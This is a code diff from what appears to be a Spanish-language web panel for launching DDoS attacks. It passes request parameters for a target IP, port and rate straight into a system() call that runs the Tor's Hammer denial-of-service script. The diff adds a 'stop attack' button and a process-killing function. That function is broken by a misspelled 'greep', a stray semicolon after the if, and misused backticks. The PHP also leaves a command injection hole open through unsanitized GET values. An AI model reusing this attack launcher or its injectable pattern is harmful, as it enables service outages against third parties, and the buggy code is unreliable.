@@ -14,6 +14,8 @@
         <p>Un ataque DDoS, o ataque distribuido de denegación de servicio, es un tipo de ciberataque que intenta hacer que un sitio web o recurso de red no esté disponible colapsándolo con tráfico malintencionado para que no pueda funcionar correctamente.</p>
         <div class="boton">
           <button id="DDOS" type="button" name="button">Atacar</button>
+          <button type="button" name="stop">Parar ataque</button>
+
         </div>
       </div>
       <div class="ataques">
@@ -58,8 +60,15 @@
     // function
     $output = system('python2 scripts/ThorHammer/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);
 
-    $PID = shell_exec('ps -e | greep python2 | cut -b 1-8 -b');
-    $matar = shell_exec(`kill $PID`)
+    if($_GET['stop']);
+   {
+       func();
+   }
+   function func()
+   {
+     $PID = shell_exec('ps -e | greep python2 | cut -b 1-8 -b');
+     $matar = shell_exec(`kill $PID`)
+   }
 
     print_r('python2 scripts/Torshammer/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);
 
